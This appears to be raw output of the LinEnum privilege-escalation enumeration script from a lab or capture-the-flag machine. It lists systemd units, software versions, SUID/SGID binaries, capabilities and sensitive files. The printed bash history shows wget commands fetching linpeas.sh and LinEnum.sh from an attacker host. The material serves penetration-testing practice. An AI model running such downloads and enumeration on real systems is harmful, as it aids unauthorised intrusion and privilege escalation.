lrwxrwxrwx 1 root root 32 Feb  1  2018 systemd-journal-flush.service -> ../systemd-journal-flush.service
lrwxrwxrwx 1 root root 36 Feb  1  2018 systemd-machine-id-commit.service -> ../systemd-machine-id-commit.service
lrwxrwxrwx 1 root root 31 Feb  1  2018 systemd-modules-load.service -> ../systemd-modules-load.service
lrwxrwxrwx 1 root root 30 Feb  1  2018 systemd-random-seed.service -> ../systemd-random-seed.service
lrwxrwxrwx 1 root root 25 Feb  1  2018 systemd-sysctl.service -> ../systemd-sysctl.service
lrwxrwxrwx 1 root root 37 Feb  1  2018 systemd-tmpfiles-setup-dev.service -> ../systemd-tmpfiles-setup-dev.service
lrwxrwxrwx 1 root root 33 Feb  1  2018 systemd-tmpfiles-setup.service -> ../systemd-tmpfiles-setup.service
lrwxrwxrwx 1 root root 30 Feb  1  2018 systemd-update-utmp.service -> ../systemd-update-utmp.service
lrwxrwxrwx 1 root root 30 Sep 13  2017 plymouth-read-write.service -> ../plymouth-read-write.service
lrwxrwxrwx 1 root root 25 Sep 13  2017 plymouth-start.service -> ../plymouth-start.service
lrwxrwxrwx 1 root root 24 Feb  1  2017 console-setup.service -> ../console-setup.service
lrwxrwxrwx 1 root root 25 Feb  1  2017 keyboard-setup.service -> ../keyboard-setup.service
lrwxrwxrwx 1 root root 19 Feb  1  2017 setvtrgb.service -> ../setvtrgb.service

/lib/systemd/system/sockets.target.wants:
total 0
lrwxrwxrwx 1 root root 31 Feb  1  2018 systemd-udevd-control.socket -> ../systemd-udevd-control.socket
lrwxrwxrwx 1 root root 30 Feb  1  2018 systemd-udevd-kernel.socket -> ../systemd-udevd-kernel.socket
lrwxrwxrwx 1 root root 25 Feb  1  2018 systemd-initctl.socket -> ../systemd-initctl.socket
lrwxrwxrwx 1 root root 32 Feb  1  2018 systemd-journald-audit.socket -> ../systemd-journald-audit.socket
lrwxrwxrwx 1 root root 34 Feb  1  2018 systemd-journald-dev-log.socket -> ../systemd-journald-dev-log.socket
lrwxrwxrwx 1 root root 26 Feb  1  2018 systemd-journald.socket -> ../systemd-journald.socket
lrwxrwxrwx 1 root root 14 Jan 12  2017 dbus.socket -> ../dbus.socket

/lib/systemd/system/getty.target.wants:
total 0
lrwxrwxrwx 1 root root 23 Feb  1  2018 getty-static.service -> ../getty-static.service

/lib/systemd/system/graphical.target.wants:
total 0
lrwxrwxrwx 1 root root 39 Feb  1  2018 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service

/lib/systemd/system/local-fs.target.wants:
total 0
lrwxrwxrwx 1 root root 29 Feb  1  2018 systemd-remount-fs.service -> ../systemd-remount-fs.service

/lib/systemd/system/rc-local.service.d:
total 4.0K
-rw-r--r-- 1 root root 290 Oct 26  2017 debian.conf

/lib/systemd/system/rescue.target.wants:
total 0
lrwxrwxrwx 1 root root 39 Feb  1  2018 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service

/lib/systemd/system/resolvconf.service.wants:
total 0
lrwxrwxrwx 1 root root 42 Feb  1  2018 systemd-networkd-resolvconf-update.path -> ../systemd-networkd-resolvconf-update.path

/lib/systemd/system/sigpwr.target.wants:
total 0
lrwxrwxrwx 1 root root 36 Feb  1  2018 sigpwr-container-shutdown.service -> ../sigpwr-container-shutdown.service

/lib/systemd/system/systemd-timesyncd.service.d:
total 4.0K
-rw-r--r-- 1 root root 251 Oct 26  2017 disable-with-time-daemon.conf

/lib/systemd/system/timers.target.wants:
total 0
lrwxrwxrwx 1 root root 31 Feb  1  2018 systemd-tmpfiles-clean.timer -> ../systemd-tmpfiles-clean.timer

/lib/systemd/system/busnames.target.wants:
total 0

/lib/systemd/system/systemd-resolved.service.d:
total 4.0K
-rw-r--r-- 1 root root 200 Oct 27  2017 resolvconf.conf

/lib/systemd/system/runlevel1.target.wants:
total 0

/lib/systemd/system/runlevel2.target.wants:
total 0

/lib/systemd/system/runlevel3.target.wants:
total 0

/lib/systemd/system/runlevel4.target.wants:
total 0

/lib/systemd/system/runlevel5.target.wants:
total 0

/lib/systemd/system-sleep:
total 4.0K
-rwxr-xr-x 1 root root 92 Mar 17  2016 hdparm

/lib/systemd/network:
total 12K
-rw-r--r-- 1 root root 404 Feb  1  2018 80-container-host0.network
-rw-r--r-- 1 root root 482 Feb  1  2018 80-container-ve.network
-rw-r--r-- 1 root root  80 Feb  1  2018 99-default.link

/lib/systemd/system-generators:
total 668K
-rwxr-xr-x 1 root root  71K Feb  1  2018 systemd-cryptsetup-generator
-rwxr-xr-x 1 root root  59K Feb  1  2018 systemd-dbus1-generator
-rwxr-xr-x 1 root root  43K Feb  1  2018 systemd-debug-generator
-rwxr-xr-x 1 root root  79K Feb  1  2018 systemd-fstab-generator
-rwxr-xr-x 1 root root  39K Feb  1  2018 systemd-getty-generator
-rwxr-xr-x 1 root root 119K Feb  1  2018 systemd-gpt-auto-generator
-rwxr-xr-x 1 root root  39K Feb  1  2018 systemd-hibernate-resume-generator
-rwxr-xr-x 1 root root  39K Feb  1  2018 systemd-insserv-generator
-rwxr-xr-x 1 root root  35K Feb  1  2018 systemd-rc-local-generator
-rwxr-xr-x 1 root root  31K Feb  1  2018 systemd-system-update-generator
-rwxr-xr-x 1 root root 103K Feb  1  2018 systemd-sysv-generator

/lib/systemd/system-preset:
total 4.0K
-rw-r--r-- 1 root root 869 Feb  1  2018 90-systemd.preset

/lib/systemd/system-shutdown:
total 0


[00;33m### SOFTWARE #############################################[00m
[00;31m[-] Sudo version:[00m
Sudo version 1.8.16


[00;31m[-] Apache version:[00m
Server version: Apache/2.4.18 (Ubuntu)
Server built:   2017-09-18T15:09:02


[00;31m[-] Apache user configuration:[00m
APACHE_RUN_USER=www-data
APACHE_RUN_GROUP=www-data


[00;31m[-] Installed Apache modules:[00m
Loaded Modules:
 core_module (static)
 so_module (static)
 watchdog_module (static)
 http_module (static)
 log_config_module (static)
 logio_module (static)
 version_module (static)
 unixd_module (static)
 access_compat_module (shared)
 alias_module (shared)
 auth_basic_module (shared)
 authn_core_module (shared)
 authn_file_module (shared)
 authz_core_module (shared)
 authz_host_module (shared)
 authz_user_module (shared)
 autoindex_module (shared)
 deflate_module (shared)
 dir_module (shared)
 env_module (shared)
 filter_module (shared)
 mime_module (shared)
 mpm_event_module (shared)
 negotiation_module (shared)
 setenvif_module (shared)
 status_module (shared)


[00;33m### INTERESTING FILES ####################################[00m
[00;31m[-] Useful file locations:[00m
/bin/nc
/bin/netcat
/usr/bin/wget


[00;31m[-] Can we read/write sensitive files:[00m
-rw-r--r-- 1 root root 1989 Mar 11  2018 /etc/passwd
-rw-r--r-- 1 root root 1028 Mar 11  2018 /etc/group
-rw-r--r-- 1 root root 575 Oct 22  2015 /etc/profile
-rw-r----- 1 root shadow 2051 Mar 11  2018 /etc/shadow


[00;31m[-] SUID files:[00m
-rwsr-xr-x 1 root root 40152 Nov 30  2017 /bin/mount
-rwsr-xr-x 1 root root 30800 Jul 12  2016 /bin/fusermount
-rwsr-xr-x 1 root root 27608 Nov 30  2017 /bin/umount
-rwsr-xr-x 1 root root 44168 May  7  2014 /bin/ping
-rwsr-xr-x 1 root root 40128 May 16  2017 /bin/su
-rwsr-xr-x 1 root root 142032 Jan 28  2017 /bin/ntfs-3g
-rwsr-xr-x 1 root root 44680 May  7  2014 /bin/ping6
-rwsr-xr-x 1 root root 10232 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 428240 Jan 18  2018 /usr/lib/openssh/ssh-keysign
-rwsr-xr-- 1 root messagebus 42992 Jan 12  2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 39904 May 16  2017 /usr/bin/newgrp
-rwsr-xr-x 1 root root 75304 May 16  2017 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 49584 May 16  2017 /usr/bin/chfn
-rwsr-xr-x 1 root root 54256 May 16  2017 /usr/bin/passwd
-rwsr-sr-x 1 root mail 89288 Nov 17  2017 /usr/bin/procmail
-rwsr-xr-x 1 root root 136808 Jul  4  2017 /usr/bin/sudo
-rwsr-xr-x 1 root root 40432 May 16  2017 /usr/bin/chsh


[00;31m[-] SGID files:[00m
-rwxr-sr-x 1 root shadow 35600 Mar 16  2016 /sbin/unix_chkpwd
-rwxr-sr-x 1 root shadow 35632 Mar 16  2016 /sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root mail 14856 Dec  6  2013 /usr/bin/dotlockfile
-rwxr-sr-x 1 root shadow 62336 May 16  2017 /usr/bin/chage
-rwxr-sr-x 1 root shadow 22768 May 16  2017 /usr/bin/expiry
-rwxr-sr-x 1 root tty 27368 Nov 30  2017 /usr/bin/wall
-rwxr-sr-x 1 root mlocate 39520 Nov 18  2014 /usr/bin/mlocate
-rwxr-sr-x 1 root tty 14752 Mar  1  2016 /usr/bin/bsd-write
-rwxr-sr-x 1 root ssh 358624 Jan 18  2018 /usr/bin/ssh-agent
-rwsr-sr-x 1 root mail 89288 Nov 17  2017 /usr/bin/procmail
-rwxr-sr-x 1 root mail 18760 Nov 17  2017 /usr/bin/lockfile
-rwxr-sr-x 1 root crontab 36080 Apr  5  2016 /usr/bin/crontab
-rwxr-sr-x 1 root mail 10664 Feb 17  2016 /usr/bin/mutt_dotlock
-r-xr-sr-x 1 root postdrop 14328 Jan 17  2018 /usr/sbin/postdrop
-r-xr-sr-x 1 root postdrop 18376 Jan 17  2018 /usr/sbin/postqueue


[00;31m[+] Files with POSIX capabilities set:[00m
/usr/bin/systemd-detect-virt = cap_dac_override,cap_sys_ptrace+ep
/usr/bin/mtr = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep


[-] Can't search *.conf files as no keyword was entered

[-] Can't search *.php files as no keyword was entered

[-] Can't search *.log files as no keyword was entered

[-] Can't search *.ini files as no keyword was entered

[00;31m[-] All *.conf files in /etc (recursive 1 level):[00m
-rw-r--r-- 1 root root 280 Jun 20  2014 /etc/fuse.conf
-rw-r--r-- 1 root root 2584 Feb 18  2016 /etc/gai.conf
-rw-r--r-- 1 root root 552 Mar 16  2016 /etc/pam.conf
-rw-r--r-- 1 root root 14867 Apr 12  2016 /etc/ltrace.conf
-rw-r--r-- 1 root root 771 Mar  6  2015 /etc/insserv.conf
-rw-r--r-- 1 root root 3059 Mar 11  2018 /etc/sysctl.conf
-rw-r--r-- 1 root root 703 May  6  2015 /etc/logrotate.conf
-rw-r--r-- 1 root root 94 Mar 11  2018 /etc/host.conf
-rw-r--r-- 1 root root 2969 Nov 10  2015 /etc/debconf.conf
-rw-r--r-- 1 root root 1260 Mar 16  2016 /etc/ucf.conf
-rw-r--r-- 1 root root 350 Mar  8  2018 /etc/popularity-contest.conf
-rw-r--r-- 1 root root 497 May  4  2014 /etc/nsswitch.conf
-rw-r--r-- 1 root root 3028 Mar  8  2018 /etc/adduser.conf
-rw-r--r-- 1 root root 967 Oct 30  2015 /etc/mke2fs.conf
-rw-r--r-- 1 root root 604 Jul  2  2015 /etc/deluser.conf
-rw-r--r-- 1 root root 4781 Mar 17  2016 /etc/hdparm.conf
-rw-r--r-- 1 root root 144 Mar  8  2018 /etc/kernel-img.conf
-rw-r--r-- 1 root root 34 Jan 27  2016 /etc/ld.so.conf
-rw-r--r-- 1 root root 155 Mar  8  2018 /etc/e2fsck.conf
-rw-r--r-- 1 root root 6488 Mar  8  2018 /etc/ca-certificates.conf
-rw-r--r-- 1 root root 1371 Jan 27  2016 /etc/rsyslog.conf
-rw-r--r-- 1 root root 191 Jan 18  2016 /etc/libaudit.conf
-rw-r--r-- 1 root root 338 Nov 18  2014 /etc/updatedb.conf


[00;31m[-] Current user's history files:[00m
-rw------- 1 baksteen users 155 Nov 20 02:53 /home/baksteen/.bash_history


[00;31m[-] Location and contents (if accessible) of .bash_history file(s):[00m
/home/baksteen/.bash_history

mkdir .ssh
nano .ssh/authorized_keys
exit
cd /dev/shm
ls
wget
wget http://10.6.18.190:8000/linpeas.sh
wget http://10.6.18.190:8000/LinEnum.sh
chmod 777 *


[00;31m[-] Location and Permissions (if accessible) of .bak file(s):[00m
-rw------- 1 root shadow 860 Mar  9  2018 /var/backups/gshadow.bak
-rw------- 1 root root 1028 Mar  9  2018 /var/backups/group.bak
-rw------- 1 root root 1989 Mar  8  2018 /var/backups/passwd.bak
-rw------- 1 root shadow 1979 Mar  8  2018 /var/backups/shadow.bak


[00;31m[-] Any interesting mail in /var/mail:[00m
total 8
drwxrwsrwx  2 mail mail 4096 Mar  9  2018 .
drwxr-xr-x 12 root root 4096 Mar  8  2018 ..


[00;33m### SCAN COMPLETE ####################################[00m
